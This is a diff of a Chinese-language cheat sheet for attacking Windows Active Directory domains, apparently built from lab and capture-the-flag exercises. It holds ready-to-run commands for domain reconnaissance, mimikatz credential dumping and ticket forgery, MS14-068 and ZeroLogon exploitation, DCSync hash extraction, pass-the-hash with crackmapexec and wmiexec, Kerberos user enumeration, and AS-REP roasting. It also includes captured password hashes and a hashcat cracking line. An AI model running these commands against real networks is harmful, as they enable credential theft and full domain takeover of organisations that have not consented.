@@ -19,6 +19,8 @@ net group "domain admins" /domain
 net localgroup administrators /domain
 # 查看域成员 假设域为god
 net view /domain:god  # tode.org则写tide
+# 查看 当前用户 的域用户组, -- 检查能不能 DCSync 攻击
+net user %username% /domain
 # 当前计算机名
 hostname
 # 查看域控列表
@@ -30,7 +32,8 @@ beacon> net dclist
 ##3. 当前网络环境为工作组，不存在域
 ```
 
-sharehound 查看收集的信息
+- sharphound 查看收集的信息
+- [域用户枚举_爆破-kerberos](#域用户枚举_爆破-kerberos)
 
 ## 域维护命令
 
@@ -103,22 +106,27 @@ psexec.exe \\WIN-3IFR5080HJGS.cc.com cmd.exe
 
 ```sh
 # 获取域控 hash
-mimikatz.exe "log res2.txt" "privilege::debug" "sekurlsa::logonpasswords" " exit"
+mimikatz.exe "log res2.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
 # 伪造白银票据
 mimikatz.exe "kerberos::golden /user:xyz /domain:cc /sid:DOMAINSID /target:WIN-3IFR5080HJGS.cc.com /service:cifs /rc4:039f0efddcab03 /ptt" exit # target: 域控主机, rc4是域控机的 ntlm 值, mimikatz中找到 WIN-3IFR5080HJGS$
 ```
 
 ### 4.MS14-068(KB3011780)
+
 [L1](https://mp.weixin.qq.com/s/tTuH3_YY_C0AuPSLfo8mTQ) [L2](https://www.freebuf.com/articles/web/340783.html)
 
 ```sh
+klist purge # 清空票据
+dir \\WIN-A46BVNA4HEK\c$
 MS14-068.exe -u xyz@cc.com -p pwd123 -s <sid> -d WIN-3IFR5080HJGS # -d 域控
 mimikatz.exe "kerberos::ptc TGT_cc@cc.com.ccache" exit           # 导入证书
 ```
 
 ### 5.zerologon CVE-2020-1472
+
 1. mimikatz - 受限:需要在子域上使用
+
 ```sh
 # 检测
 lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$
@@ -126,7 +134,8 @@ lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$
 lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$ /exploit
 ```
 
-python方式 - 不受限
+python 方式 - 不受限
+
 ```sh
 # 测试
 proxychains python3 zerologon_tester.py WIN-3IFR5080HJGS 192.168.80.100
@@ -162,7 +171,9 @@ $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e3b042707eda06c25e25766ec329fcd9 
 python3 secretsdump.py cc.com/administrator:123.com@192.168.80.100 -just-dc-user 'WIN-3IFR5080HJGS$'
 # 验证2 proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
 ```
+
 ### 6.本地用户提权再深入
+
 hotpotato
 DAY36 内网域渗透 「更新中」.mp4
 
@@ -226,9 +237,9 @@ schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192
 - 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
 - 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限
 
-### Dsync 攻击
+### DCSync 攻击
 
-[Dsync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)
+[DCSync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)
 
 DCSync 攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：
 
@@ -245,7 +256,13 @@ meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 ```
 
-#### 添加 dsync 权限, 见 春秋云境——Exchange
+示例 2
+
+```sh
+
+```
+
+#### 添加 DCSync 权限, 见 春秋云境——Exchange
 
 ```
 方式一
@@ -331,6 +348,33 @@ mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
 python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 ```
 
+### 域用户枚举\_爆破 Kerberos
+
+[爆破 Kerberos](http://www.fzwjscj.xyz/index.php/archives/51/)
+
+```sh
+# 域用户枚举  https://github.com/ropnop/kerbrute
+./kerbrute_linux_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab user_name.txt -t 10
+```
+
+- AS-REPRoasting
+  对于域用户，如果设置了选项 Do not require Kerberos preauthentication(不要求 Kerberos 预身份认证)，此时向域控制器的 88 端口发送 AS-REQ 请求，对收到的 AS-REP 内容重新组合，能够拼接成"Kerberos 5 AS-REP etype 23"(18200)的格式，接下来可以使用 hashcat 或是 john 对其破解，最终获得该用户的明文口令
+
+```sh
+# 查找未设置预认证的账号
+proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/
+```
+
+得到两个账号 wenshao@xiaorang.lab 、zhangxin@xiaorang.lab
+
+```sh
+$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994
+$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:971802b84ce99050ad3c5f49d11fd0b7$6c1be075c3cf2a7695529de2ebbf39c5ec7e5326c9d891dac2107b239892f76befe52c860e4e1e2ff6537a5765a6bcb6b8baca792d60765ac0bbe1b3c5e59f3ec51b7426636a437d5df12130eb68d9b17ef431455415671c7331a17ce823e28cc411677bed341d3fceefc3451b8b232ea6039661625a5c793e30c4d149b2ed9d2926e9d825b3828744ebce69e47746994c9a749ceeb76c560a1840bc74d2b9f301bb5b870c680591516354460dab2238e7827900ed80320dd3a6f46874b1bc8a3a68aea7bd11d0683ec94103f59d9511691090928e98d0d8978f511e71fd9db0067fa0d450c120f3726918d7
+
+# 使用hashcat解密
+hashcat -m 18200 --force -a 0 '$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994' rockyou.txt
+```
+
 ## Tool
 
 ### Rubeus
@@ -385,6 +429,7 @@ net use P: \\Name\zhq3211
 # Tools
 
 ## impacket/wmiexec.py
+
 ```sh
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
@@ -392,7 +437,11 @@ net use P: \\Name\zhq3211
  lget {file}                 - downloads pathname to the current local dir
  ! {cmd}                    - executes a local shell cmd
 ```
+
 # Article
 
+rw_domain_域渗透 - 域控使用组策略下发文件并执行.rar
 [域内定位个人 PC 的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
-[【内网域渗透系列教程】](https://www.bilibili.com/video/BV1xb4y1y7ju/)
+[内网域渗透系列教程](https://www.bilibili.com/video/BV1xb4y1y7ju/)
+[内网域渗透之常用提权](https://www.cnblogs.com/first-kiss/articles/16213182.html)
+
